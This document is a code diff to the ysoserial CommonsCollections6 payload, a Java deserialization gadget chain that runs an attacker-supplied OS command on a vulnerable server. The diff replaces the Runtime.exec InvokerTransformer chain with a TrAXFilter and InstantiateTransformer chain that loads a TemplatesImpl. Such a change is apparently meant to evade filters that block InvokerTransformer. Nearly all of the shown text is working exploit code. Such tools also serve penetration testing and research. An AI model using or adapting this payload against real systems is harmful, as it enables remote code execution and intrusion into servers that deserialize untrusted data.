@@ -1,16 +1,19 @@
 package ysoserial.payloads;
 
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
+import javax.xml.transform.Templates;
 import java.io.Serializable;
 import java.lang.reflect.Field;
 import java.util.HashMap;
@@ -44,18 +47,12 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
 
     public Serializable getObject(final String command) throws Exception {
 
-        final String[] execArgs = new String[]{command};
+        Object obj = Gadgets.createTemplatesImpl(command);
 
         final Transformer[] transformers = new Transformer[]{
-            new ConstantTransformer(Runtime.class),
-            new InvokerTransformer("getMethod", new Class[]{
-                String.class, Class[].class}, new Object[]{
-                "getRuntime", new Class[0]}),
-            new InvokerTransformer("invoke", new Class[]{
-                Object.class, Object[].class}, new Object[]{
-                null, new Object[0]}),
-            new InvokerTransformer("exec",
-                new Class[]{String.class}, execArgs),
+            new ConstantTransformer(TrAXFilter.class),
+            new InstantiateTransformer(new Class[]{Templates.class},
+                new Object[]{obj}),
             new ConstantTransformer(1)};
 
         Transformer transformerChain = new ChainedTransformer(transformers);
